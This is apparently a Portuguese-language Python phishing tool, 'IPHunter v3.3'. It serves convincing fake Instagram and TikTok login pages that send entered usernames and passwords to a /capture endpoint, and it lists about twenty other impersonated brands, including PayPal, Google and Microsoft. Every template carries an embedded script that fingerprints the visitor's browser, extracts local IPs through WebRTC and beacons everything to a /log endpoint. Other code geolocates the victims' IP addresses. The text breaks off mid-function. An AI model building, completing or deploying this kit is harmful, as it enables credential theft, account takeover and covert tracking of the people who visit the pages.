#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ============================================================
#  IPHunter v3.3 - IP Logger & Phishing Tool
#  Instagram 2026 Edition - Corrigido e Melhorado
# ============================================================

import os
import sys
import subprocess
import time
import json
import re
import socket
import threading
import http.server
import socketserver
import urllib.request
from datetime import datetime
from urllib.parse import parse_qs, urlparse

# ============================================================
#  CORES ANSI
# ============================================================
class C:
    RESET       = "\033[0m"
    BOLD        = "\033[1m"
    DIM         = "\033[2m"
    RED         = "\033[31m"
    GREEN       = "\033[32m"
    YELLOW      = "\033[33m"
    BLUE        = "\033[34m"
    MAGENTA     = "\033[35m"
    CYAN        = "\033[36m"
    WHITE       = "\033[37m"
    BRIGHT_RED      = "\033[91m"
    BRIGHT_GREEN    = "\033[92m"
    BRIGHT_YELLOW   = "\033[93m"
    BRIGHT_BLUE     = "\033[94m"
    BRIGHT_MAGENTA  = "\033[95m"
    BRIGHT_CYAN     = "\033[96m"
    BRIGHT_WHITE    = "\033[97m"

# ============================================================
#  DETECTAR AMBIENTE E CONFIGURAR PATHS
# ============================================================
IS_TERMUX = os.path.exists('/data/data/com.termux/files/usr')
if IS_TERMUX:
    TMP_DIR = '/data/data/com.termux/files/usr/tmp'
    PREFIX = '/data/data/com.termux/files/usr'
else:
    TMP_DIR = '/tmp'
    PREFIX = '/usr/local'

os.makedirs(TMP_DIR, exist_ok=True)

# ============================================================
#  BANNER - CENTRALIZADO
# ============================================================
BANNER = """
              ██████╗ ██╗  ██╗██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗ 
              ██╔══██╗██║  ██║██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
              ██████╔╝███████║███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝
              ██╔═══╝ ██╔══██║██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗
              ██║     ██║  ██║██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║
              ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
                                    v3.3 - 2026 Edition
"""

# ============================================================
#  IP LOGGER SCRIPT - INFORMAÇÕES REAIS E MÁXIMAS
# ============================================================
IP_LOGGER_SCRIPT = """
<script>
(function(){
  function sendData(extra) {
    var params = [];
    for (var k in extra) {
      params.push(encodeURIComponent(k) + '=' + encodeURIComponent(extra[k]));
    }
    var img = new Image();
    img.src = '/log?' + params.join('&');
  }

  // Coletar máximo de informações reais
  var data = {
    ref: document.referrer || 'Direct',
    ua: navigator.userAgent,
    lang: navigator.language || 'unknown',
    langs: (navigator.languages || []).join(','),
    plat: navigator.platform,
    vendor: navigator.vendor || 'unknown',
    online: navigator.onLine,
    cookie: navigator.cookieEnabled,
    dnt: navigator.doNotTrack || 'unknown',
    pdf: navigator.pdfViewerEnabled !== undefined ? navigator.pdfViewerEnabled : 'unknown',
    hw_cores: navigator.hardwareConcurrency || 'unknown',
    device_mem: navigator.deviceMemory || 'unknown',
    max_touch: navigator.maxTouchPoints || 0,
    screen_w: screen.width,
    screen_h: screen.height,
    screen_avail_w: screen.availWidth,
    screen_avail_h: screen.availHeight,
    screen_color: screen.colorDepth,
    screen_pixel: window.devicePixelRatio || 1,
    screen_orient: (screen.orientation || {}).type || 'unknown',
    tz: Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown',
    tz_offset: new Date().getTimezoneOffset(),
    window_w: window.innerWidth,
    window_h: window.innerHeight,
    doc_w: document.documentElement.scrollWidth,
    doc_h: document.documentElement.scrollHeight,
    url: window.location.href,
    host: window.location.hostname,
    proto: window.location.protocol,
    port: window.location.port || 'default'
  };

  // Tentar pegar IP real via múltiplas APIs
  function tryIP() {
    var apis = [
      'https://api.ipify.org?format=json',
      'https://ipapi.co/json/',
      'https://api64.ipify.org?format=json'
    ];
    var tried = 0;
    function next() {
      if (tried >= apis.length) {
        sendData(data);
        return;
      }
      var xhr = new XMLHttpRequest();
      xhr.open('GET', apis[tried], true);
      xhr.timeout = 3000;
      xhr.onreadystatechange = function() {
        if (xhr.readyState === 4) {
          if (xhr.status === 200) {
            try {
              var r = JSON.parse(xhr.responseText);
              data.ip = r.ip || r.query || r.origin || 'unknown';
              data.ip_isp = r.isp || r.org || 'unknown';
              data.ip_city = r.city || 'unknown';
              data.ip_region = r.region || r.regionName || 'unknown';
              data.ip_country = r.country || r.country_name || 'unknown';
              data.ip_country_code = r.countryCode || r.country_code || 'unknown';
              data.ip_zip = r.zip || r.postal || 'unknown';
              data.ip_lat = r.lat || 'unknown';
              data.ip_lon = r.lon || r.lng || 'unknown';
              data.ip_timezone = r.timezone || 'unknown';
            } catch(e) {}
          }
          tried++;
          next();
        }
      };
      xhr.onerror = xhr.ontimeout = function() { tried++; next(); };
      xhr.send();
    }
    next();
  }

  // Tentar WebRTC para IP local
  try {
    var pc = new RTCPeerConnection({iceServers:[]});
    pc.createDataChannel('');
    pc.createOffer().then(function(o){
      pc.setLocalDescription(o);
      setTimeout(function(){
        var sdp = pc.localDescription ? pc.localDescription.sdp : '';
        var ips = [];
        var lines = sdp.split('\\n');
        for (var i=0;i<lines.length;i++){
          var line = lines[i];
          if (line.indexOf('a=candidate') !== -1){
            var parts = line.split(' ');
            if (parts.length >= 5){
              var ip = parts[4];
              if (ip && ip.indexOf('.') !== -1 && ip !== '0.0.0.0'){
                ips.push(ip);
              }
            }
          }
        }
        if (ips.length > 0) data.webrtc_ips = ips.join(',');
        pc.close();
        tryIP();
      }, 1500);
    }).catch(function(){ tryIP(); });
  } catch(e) { tryIP(); }
})();
</script>
"""

# ============================================================
#  INSTAGRAM TEMPLATE 2026 - IDENTICO AO ORIGINAL DARK MODE
# ============================================================
INSTAGRAM_TEMPLATE = """<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Instagram</title>
<link rel="icon" href="https://static.cdninstagram.com/rsrc.php/v3/yI/r/VsNE-OHk_8a.png">
<style>
* { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
body {
  background: #000000;
  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
  min-height: 100vh;
  display: flex;
  flex-direction: column;
  align-items: center;
  color: #ffffff;
  overflow-x: hidden;
}
.lang-selector {
  width: 100%;
  text-align: center;
  padding: 12px 0 8px;
  color: #a8a8a8;
  font-size: 12px;
  font-weight: 400;
}
.lang-selector::after {
  content: ' ▼';
  font-size: 8px;
}
.main-container {
  width: 100%;
  max-width: 350px;
  padding: 0 16px;
  display: flex;
  flex-direction: column;
  align-items: center;
  flex: 1;
  justify-content: center;
  margin-top: -40px;
}
.logo-container {
  margin-bottom: 36px;
  display: flex;
  justify-content: center;
}
.logo-container img {
  width: 175px;
  height: auto;
  filter: brightness(0) invert(1);
}
.form-container {
  width: 100%;
}
.input-field {
  width: 100%;
  padding: 14px 12px;
  margin: 6px 0;
  background: #121212;
  border: 1px solid #363636;
  border-radius: 4px;
  color: #ffffff;
  font-size: 14px;
  font-family: inherit;
  outline: none;
  transition: border-color 0.2s;
}
.input-field::placeholder { color: #a8a8a8; }
.input-field:focus { border-color: #a8a8a8; }
.login-btn {
  width: 100%;
  padding: 12px;
  margin-top: 14px;
  background: #0095f6;
  color: #ffffff;
  border: none;
  border-radius: 8px;
  font-size: 14px;
  font-weight: 600;
  cursor: pointer;
  font-family: inherit;
}
.login-btn:hover { background: #1877f2; }
.forgot-link {
  display: block;
  text-align: right;
  margin: 12px 0 0 0;
  color: #e0f1ff;
  font-size: 12px;
  font-weight: 400;
  text-decoration: none;
}
.divider {
  display: flex;
  align-items: center;
  margin: 20px 0;
  color: #737373;
  font-size: 13px;
  font-weight: 600;
}
.divider::before,
.divider::after {
  content: '';
  flex: 1;
  height: 1px;
  background: #363636;
}
.divider::before { margin-right: 16px; }
.divider::after { margin-left: 16px; }
.fb-login {
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 8px;
  color: #0095f6;
  font-size: 14px;
  font-weight: 600;
  text-decoration: none;
  margin-bottom: 20px;
}
.fb-login svg {
  width: 16px;
  height: 16px;
  fill: #0095f6;
}
.signup-section {
  width: 100%;
  max-width: 350px;
  padding: 20px 16px;
  text-align: center;
  color: #a8a8a8;
  font-size: 14px;
}
.signup-section a {
  color: #0095f6;
  text-decoration: none;
  font-weight: 600;
}
.get-app {
  text-align: center;
  color: #a8a8a8;
  font-size: 14px;
  margin-bottom: 16px;
}
.app-badges {
  display: flex;
  justify-content: center;
  gap: 8px;
  margin-bottom: 40px;
}
.app-badges img {
  height: 40px;
}
.footer {
  width: 100%;
  text-align: center;
  padding: 20px 0 40px;
  color: #737373;
  font-size: 12px;
}
.footer-links {
  display: flex;
  flex-wrap: wrap;
  justify-content: center;
  gap: 8px 16px;
  margin-bottom: 16px;
  padding: 0 16px;
}
.footer-links a {
  color: #737373;
  text-decoration: none;
  font-size: 12px;
}
.footer-meta {
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 16px;
  color: #737373;
  font-size: 12px;
}
</style>""" + IP_LOGGER_SCRIPT + """
</head>
<body>
<div class="lang-selector">Portugues (Brasil)</div>
<div class="main-container">
  <div class="logo-container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/2560px-Instagram_logo.svg.png" alt="Instagram">
  </div>
  <div class="form-container">
    <form action="/capture" method="POST">
      <input type="text" name="username" class="input-field" placeholder="Nome de usuario, telefone ou email" required autocomplete="username">
      <input type="password" name="password" class="input-field" placeholder="Senha" required autocomplete="current-password">
      <button type="submit" class="login-btn">Entrar</button>
    </form>
    <a href="#" class="forgot-link">Esqueceu a senha?</a>
    <div class="divider">OU</div>
    <a href="#" class="fb-login">
      <svg viewBox="0 0 24 24"><path d="M12 2.04C6.5 2.04 2 6.53 2 12.06C2 17.06 5.66 21.21 10.44 21.96V14.96H7.9V12.06H10.44V9.85C10.44 7.34 11.93 5.96 14.22 5.96C15.31 5.96 16.45 6.15 16.45 6.15V8.62H15.19C13.95 8.62 13.56 9.39 13.56 10.18V12.06H16.34L15.89 14.96H13.56V21.96C15.9164 21.5878 18.0622 20.3855 19.6099 18.5701C21.1576 16.7546 22.0054 14.4456 22 12.06C22 6.53 17.5 2.04 12 2.04Z"/></svg>
      Entrar com o Facebook
    </a>
  </div>
</div>
<div class="signup-section">
  Nao tem uma conta? <a href="#">Cadastre-se</a>
</div>
<div class="get-app">Obtenha o aplicativo.</div>
<div class="app-badges">
  <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Google Play">
  <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Microsoft Store">
</div>
<div class="footer">
  <div class="footer-links">
    <a href="#">Meta</a>
    <a href="#">Sobre</a>
    <a href="#">Blog</a>
    <a href="#">Carreiras</a>
    <a href="#">Ajuda</a>
    <a href="#">API</a>
    <a href="#">Privacidade</a>
    <a href="#">Termos</a>
    <a href="#">Principais contas</a>
    <a href="#">Localizacoes</a>
    <a href="#">Instagram Lite</a>
    <a href="#">Carregamento de contatos e nao usuarios</a>
    <a href="#">Meta Verified</a>
  </div>
  <div class="footer-meta">
    <span>Portugues (Brasil)</span>
    <span>&copy; 2026 Instagram from Meta</span>
  </div>
</div>
</body>
</html>"""

# ============================================================
#  EMPTY TEMPLATE
# ============================================================
TIKTOK_TEMPLATE = """<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>TikTok - Make Your Day</title>
<link rel="icon" href="https://lf16-tiktok-web.tiktokcdn-us.com/obj/tiktok-web-tx/tiktok/favicon.ico">
<style>
* { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
body {
  background: #000000;
  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
  min-height: 100vh;
  display: flex;
  flex-direction: column;
  align-items: center;
  color: #ffffff;
  overflow-x: hidden;
}
.container {
  width: 100%;
  max-width: 400px;
  padding: 0 24px;
  display: flex;
  flex-direction: column;
  align-items: center;
  flex: 1;
  justify-content: center;
}
.logo {
  margin-bottom: 32px;
  display: flex;
  justify-content: center;
}
.logo svg {
  width: 48px;
  height: 48px;
}
.title {
  font-size: 24px;
  font-weight: 700;
  margin-bottom: 32px;
  text-align: center;
  color: #ffffff;
}
.btn-option {
  width: 100%;
  padding: 14px 16px;
  margin: 6px 0;
  background: #f1f1f2;
  border: none;
  border-radius: 4px;
  color: #161823;
  font-size: 15px;
  font-weight: 600;
  cursor: pointer;
  font-family: inherit;
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 10px;
  transition: background 0.15s;
}
.btn-option:hover { background: #e3e3e5; }
.btn-option svg, .btn-option img {
  width: 20px;
  height: 20px;
}
.divider {
  display: flex;
  align-items: center;
  margin: 20px 0;
  color: #8a8b91;
  font-size: 13px;
  font-weight: 400;
  width: 100%;
}
.divider::before,
.divider::after {
  content: '';
  flex: 1;
  height: 1px;
  background: #2f2f2f;
}
.divider::before { margin-right: 12px; }
.divider::after { margin-left: 12px; }
.form-section {
  width: 100%;
  display: none;
}
.form-section.active { display: block; }
.input-field {
  width: 100%;
  padding: 14px 12px;
  margin: 8px 0;
  background: #1a1a1a;
  border: 1px solid #2f2f2f;
  border-radius: 4px;
  color: #ffffff;
  font-size: 15px;
  font-family: inherit;
  outline: none;
  transition: border-color 0.2s;
}
.input-field::placeholder { color: #8a8b91; }
.input-field:focus { border-color: #fe2c55; }
.btn-login {
  width: 100%;
  padding: 14px;
  margin-top: 16px;
  background: #fe2c55;
  color: #ffffff;
  border: none;
  border-radius: 4px;
  font-size: 16px;
  font-weight: 700;
  cursor: pointer;
  font-family: inherit;
  transition: background 0.15s;
}
.btn-login:hover { background: #e62548; }
.forgot-link {
  display: block;
  text-align: center;
  margin: 16px 0 0 0;
  color: #8a8b91;
  font-size: 13px;
  font-weight: 400;
  text-decoration: none;
}
.signup-section {
  width: 100%;
  padding: 24px;
  text-align: center;
  color: #8a8b91;
  font-size: 14px;
  border-top: 1px solid #2f2f2f;
  margin-top: auto;
}
.signup-section a {
  color: #fe2c55;
  text-decoration: none;
  font-weight: 600;
}
.back-link {
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 6px;
  margin-top: 20px;
  color: #8a8b91;
  font-size: 14px;
  text-decoration: none;
  cursor: pointer;
}
.back-link svg {
  width: 16px;
  height: 16px;
  fill: #8a8b91;
}
</style>
<script>
(function(){
  function sendData(extra) {
    var params = [];
    for (var k in extra) {
      params.push(encodeURIComponent(k) + '=' + encodeURIComponent(extra[k]));
    }
    var img = new Image();
    img.src = '/log?' + params.join('&');
  }
  var data = {
    ref: document.referrer || 'Direct',
    ua: navigator.userAgent,
    lang: navigator.language || 'unknown',
    langs: (navigator.languages || []).join(','),
    plat: navigator.platform,
    vendor: navigator.vendor || 'unknown',
    online: navigator.onLine,
    cookie: navigator.cookieEnabled,
    dnt: navigator.doNotTrack || 'unknown',
    pdf: navigator.pdfViewerEnabled !== undefined ? navigator.pdfViewerEnabled : 'unknown',
    hw_cores: navigator.hardwareConcurrency || 'unknown',
    device_mem: navigator.deviceMemory || 'unknown',
    max_touch: navigator.maxTouchPoints || 0,
    screen_w: screen.width,
    screen_h: screen.height,
    screen_avail_w: screen.availWidth,
    screen_avail_h: screen.availHeight,
    screen_color: screen.colorDepth,
    screen_pixel: window.devicePixelRatio || 1,
    screen_orient: (screen.orientation || {}).type || 'unknown',
    tz: Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown',
    tz_offset: new Date().getTimezoneOffset(),
    window_w: window.innerWidth,
    window_h: window.innerHeight,
    doc_w: document.documentElement.scrollWidth,
    doc_h: document.documentElement.scrollHeight,
    url: window.location.href,
    host: window.location.hostname,
    proto: window.location.protocol,
    port: window.location.port || 'default'
  };
  function tryIP() {
    var apis = [
      'https://api.ipify.org?format=json',
      'https://ipapi.co/json/',
      'https://api64.ipify.org?format=json'
    ];
    var tried = 0;
    function next() {
      if (tried >= apis.length) {
        sendData(data);
        return;
      }
      var xhr = new XMLHttpRequest();
      xhr.open('GET', apis[tried], true);
      xhr.timeout = 3000;
      xhr.onreadystatechange = function() {
        if (xhr.readyState === 4) {
          if (xhr.status === 200) {
            try {
              var r = JSON.parse(xhr.responseText);
              data.ip = r.ip || r.query || r.origin || 'unknown';
              data.ip_isp = r.isp || r.org || 'unknown';
              data.ip_city = r.city || 'unknown';
              data.ip_region = r.region || r.regionName || 'unknown';
              data.ip_country = r.country || r.country_name || 'unknown';
              data.ip_country_code = r.countryCode || r.country_code || 'unknown';
              data.ip_zip = r.zip || r.postal || 'unknown';
              data.ip_lat = r.lat || 'unknown';
              data.ip_lon = r.lon || r.lng || 'unknown';
              data.ip_timezone = r.timezone || 'unknown';
            } catch(e) {}
          }
          tried++;
          next();
        }
      };
      xhr.onerror = xhr.ontimeout = function() { tried++; next(); };
      xhr.send();
    }
    next();
  }
  try {
    var pc = new RTCPeerConnection({iceServers:[]});
    pc.createDataChannel('');
    pc.createOffer().then(function(o){
      pc.setLocalDescription(o);
      setTimeout(function(){
        var sdp = pc.localDescription ? pc.localDescription.sdp : '';
        var ips = [];
        var lines = sdp.split('\n');
        for (var i=0;i<lines.length;i++){
          var line = lines[i];
          if (line.indexOf('a=candidate') !== -1){
            var parts = line.split(' ');
            if (parts.length >= 5){
              var ip = parts[4];
              if (ip && ip.indexOf('.') !== -1 && ip !== '0.0.0.0'){
                ips.push(ip);
              }
            }
          }
        }
        if (ips.length > 0) data.webrtc_ips = ips.join(',');
        pc.close();
        tryIP();
      }, 1500);
    }).catch(function(){ tryIP(); });
  } catch(e) { tryIP(); }
})();
</script>
</head>
<body>
<div class="container">
  <div class="logo">
    <svg viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
      <path d="M36.8 16.4c2.8 0 5.2-1.8 6.1-4.3.1-.3.1-.5-.1-.7-.2-.2-.5-.2-.7-.1-1.5.8-3.2 1.2-4.9 1.2h-.4V8.2c0-.3-.2-.5-.5-.5h-3.6c-.3 0-.5.2-.5.5v16.8c0 3.2-2.6 5.8-5.8 5.8s-5.8-2.6-5.8-5.8 2.6-5.8 5.8-5.8c.3 0 .5-.2.5-.5v-3.6c0-.3-.2-.5-.5-.5-5.2 0-9.4 4.2-9.4 9.4s4.2 9.4 9.4 9.4 9.4-4.2 9.4-9.4V16.4z" fill="#ffffff"/>
      <path d="M24 4.3c-.3 0-.5.2-.5.5v3.6c0 .3.2.5.5.5 2.8 0 5.2 1.8 6.1 4.3.1.3.3.4.6.4h3.6c.3 0 .5-.2.5-.5 0-5.2-4.2-9.4-9.4-9.4-.4 0-.7-.2-.9-.4z" fill="#25F4EE"/>
      <path d="M30.2 8.2c-.3 0-.5.2-.5.5v3.6c0 .3.2.5.5.5 2.8 0 5.2 1.8 6.1 4.3.1.3.3.4.6.4h3.6c.3 0 .5-.2.5-.5 0-5.2-4.2-9.4-9.4-9.4z" fill="#FE2C55"/>
    </svg>
  </div>
  <div class="title">Log in to TikTok</div>
  <div id="options-section">
    <button class="btn-option" onclick="showForm()">
      <svg viewBox="0 0 24 24" fill="#161823"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
      Use phone / email / username
    </button>
    <button class="btn-option">
      <svg viewBox="0 0 24 24"><path d="M12 2.04C6.5 2.04 2 6.53 2 12.06C2 17.06 5.66 21.21 10.44 21.96V14.96H7.9V12.06H10.44V9.85C10.44 7.34 11.93 5.96 14.22 5.96C15.31 5.96 16.45 6.15 16.45 6.15V8.62H15.19C13.95 8.62 13.56 9.39 13.56 10.18V12.06H16.34L15.89 14.96H13.56V21.96C15.9164 21.5878 18.0622 20.3855 19.6099 18.5701C21.1576 16.7546 22.0054 14.4456 22 12.06C22 6.53 17.5 2.04 12 2.04Z" fill="#1877F2"/></svg>
      Continue with Facebook
    </button>
    <button class="btn-option">
      <svg viewBox="0 0 24 24"><path d="M17.05 20.28c-.98.95-2.05.88-3.08.4-1.09-.5-2.08-.48-3.24 0-1.44.62-2.2.44-3.06-.4C2.79 15.25 3.51 7.59 9.05 7.31c1.35.07 2.29.74 3.08.74 1.18 0 2.31-1.29 3.76-1.1.64.03 2.44.26 3.59 1.96-.09.06-2.14 1.25-2.12 3.72.02 2.96 2.59 3.95 2.63 3.97-.03.1-.41 1.39-1.21 2.77-.73 1.25-1.49 2.49-2.63 2.51-.71.01-1.18-.42-2.2-.42-1.17-.01-1.58.43-2.3.41zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.29 2.58-2.34 4.5-3.74 4.25z" fill="#000"/></svg>
      Continue with Apple
    </button>
    <button class="btn-option">
      <svg viewBox="0 0 24 24"><path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/><path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/><path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/><path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/></svg>
      Continue with Google
    </button>
    <button class="btn-option">
      <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z" fill="#8a8b91"/></svg>
      Continue with Twitter
    </button>
    <div class="divider">or</div>
    <div style="text-align:center; color:#8a8b91; font-size:13px; margin-top:8px;">
      Don't have an account? <a href="#" style="color:#fe2c55; text-decoration:none; font-weight:600;">Sign up</a>
    </div>
  </div>
  <div id="form-section" class="form-section">
    <form action="/capture" method="POST">
      <input type="text" name="username" class="input-field" placeholder="Email / Username" required autocomplete="username">
      <input type="password" name="password" class="input-field" placeholder="Password" required autocomplete="current-password">
      <a href="#" class="forgot-link">Forgot password?</a>
      <button type="submit" class="btn-login">Log in</button>
    </form>
    <div class="back-link" onclick="showOptions()">
      <svg viewBox="0 0 24 24"><path d="M15.41 7.41L14 6l-6 6 6 6 1.41-1.41L10.83 12z"/></svg>
      Go back
    </div>
  </div>
</div>
<div class="signup-section">
  Don't have an account? <a href="#">Sign up</a>
</div>
<script>
function showForm() {
  document.getElementById('options-section').style.display = 'none';
  document.getElementById('form-section').classList.add('active');
}
function showOptions() {
  document.getElementById('form-section').classList.remove('active');
  document.getElementById('options-section').style.display = 'block';
}
</script>
</body>
</html>"""

# ============================================================
#  EMPTY TEMPLATE
# ============================================================
EMPTY_TEMPLATE = """<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Carregando...</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000000;min-height:100vh;display:flex;justify-content:center;align-items:center;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;color:#fff;overflow:hidden}
.loader-wrap{position:relative;width:100%;height:100vh;display:flex;flex-direction:column;justify-content:center;align-items:center}
.ring{width:60px;height:60px;border:3px solid rgba(255,255,255,0.1);border-top:3px solid #fff;border-radius:50%;animation:spin 1s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}
h1{font-size:1.2rem;font-weight:400;margin-top:24px;letter-spacing:0.5px;color:rgba(255,255,255,0.7)}
p{font-size:0.85rem;color:rgba(255,255,255,0.4);margin-top:8px}
.dots::after{content:'';animation:dots 1.5s steps(4,end) infinite}
@keyframes dots{0%{content:''}25%{content:'.'}50%{content:'..'}75%{content:'...'}100%{content:''}}
</style>""" + IP_LOGGER_SCRIPT + """
</head><body>
<div class="loader-wrap">
<div class="ring"></div>
<h1>Carregando<span class="dots"></span></h1>
<p>Por favor, aguarde um momento</p>
</div></body></html>"""

# ============================================================
#  CONFIGURACAO DOS SITES
# ============================================================
SITES = {
    '01': ('IP Logger (Site Vazio)', EMPTY_TEMPLATE),
    '02': ('Facebook', EMPTY_TEMPLATE),
    '03': ('Instagram', INSTAGRAM_TEMPLATE),
    '04': ('Google', EMPTY_TEMPLATE),
    '05': ('Netflix', EMPTY_TEMPLATE),
    '06': ('Microsoft', EMPTY_TEMPLATE),
    '07': ('Twitter/X', EMPTY_TEMPLATE),
    '08': ('PayPal', EMPTY_TEMPLATE),
    '09': ('TikTok', TIKTOK_TEMPLATE),
    '10': ('Spotify', EMPTY_TEMPLATE),
    '11': ('Discord', EMPTY_TEMPLATE),
    '12': ('Snapchat', EMPTY_TEMPLATE),
    '13': ('LinkedIn', EMPTY_TEMPLATE),
    '14': ('Twitch', EMPTY_TEMPLATE),
    '15': ('Steam', EMPTY_TEMPLATE),
    '16': ('Pinterest', EMPTY_TEMPLATE),
    '17': ('Reddit', EMPTY_TEMPLATE),
    '18': ('GitHub', EMPTY_TEMPLATE),
    '19': ('WhatsApp Web', EMPTY_TEMPLATE),
    '20': ('Telegram Web', EMPTY_TEMPLATE),
}

# ============================================================
#  VARIAVEIS GLOBAIS
# ============================================================
captured_data = []
ip_logs = []
last_public_ip = {}  # Armazena o ultimo IP publico por IP local
server_running = False
httpd = None
server_thread = None
current_template = ""
redirect_url = "https://google.com"

# ============================================================
#  FUNCOES UTILITARIAS
# ============================================================
def clear():
    os.system('clear')

def print_header(title):
    print()
    print(C.CYAN + "╔" + "═" * 58 + "╗" + C.RESET)
    padding = (58 - len(title)) // 2
    print(C.CYAN + "║" + C.RESET + " " * padding + C.BRIGHT_CYAN + C.BOLD + title + C.RESET + " " * (58 - len(title) - padding) + C.CYAN + "║" + C.RESET)
    print(C.CYAN + "╚" + "═" * 58 + "╝" + C.RESET)
    print()

def print_section(title):
    print()
    print(C.BRIGHT_BLUE + "┌" + "─" * 58 + "┐" + C.RESET)
    padding = (58 - len(title)) // 2
    print(C.BRIGHT_BLUE + "│" + C.RESET + " " * padding + C.BRIGHT_WHITE + C.BOLD + title + C.RESET + " " * (58 - len(title) - padding) + C.BRIGHT_BLUE + "│" + C.RESET)
    print(C.BRIGHT_BLUE + "└" + "─" * 58 + "┘" + C.RESET)
    print()

def print_info(text):
    print(f"    {C.CYAN}ℹ {text}{C.RESET}")

def print_ok(text):
    print(f"    {C.GREEN}✓ {text}{C.RESET}")

def print_error(text):
    print(f"    {C.RED}✗ {text}{C.RESET}")

def print_warn(text):
    print(f"    {C.YELLOW}⚠ {text}{C.RESET}")

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

# ============================================================
#  GEOLOCALIZACAO IP COMPLETA - DADOS REAIS
# ============================================================
def get_ip_geolocation(ip):
    """Obtem informacoes completas e REAIS de geolocalizacao do IP"""

    # Se for IP local, nao tentar geolocalizar
    if ip.startswith(('192.168.', '10.', '172.16.', '172.17.', '172.18.', '172.19.', 
                      '172.20.', '172.21.', '172.22.', '172.23.', '172.24.', '172.25.',
                      '172.26.', '172.27.', '172.28.', '172.29.', '172.30.', '172.31.',
                      '127.', '0.', '::1', 'fc', 'fd')):
        return {'status': 'fail', 'error': 'IP local/privado - nao geolocalizavel'}

    geo_data = {}

    # Tenta ip-api.com (mais completo)
    try:
        req = urllib.request.Request(
            f'http://ip-api.com/json/{ip}?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query',
            headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
        )
        with urllib.request.urlopen(req, timeout=8) as response:
            data = json.loads(response.read().decode())
            if data.get('status') == 'success':
                return data
            else:
                geo_data['error_ipapi'] = data.get('message', 'Unknown')
    except Exception as e:
        geo_data['error_ipapi'] = str(e)

    # Fallback: ipapi.co
    try:
        req = urllib.request.Request(
            f'https://ipapi.co/{ip}/json/',
            headers={'User-Agent': 'Mozilla/5.0'}
        )
        with urllib.request.urlopen(req, timeout=8) as response:
            data = json.loads(response.read().decode())
            if not data.get('error'):
                return {
                    'status': 'success',
                    'country': data.get('country_name'),
                    'countryCode': data.get('country_code'),
                    'regionName': data.get('region'),
                    'city': data.get('city'),
                    'zip': data.get('postal'),
                    'lat': data.get('latitude'),
                    'lon': data.get('longitude'),
                    'timezone': data.get('timezone'),
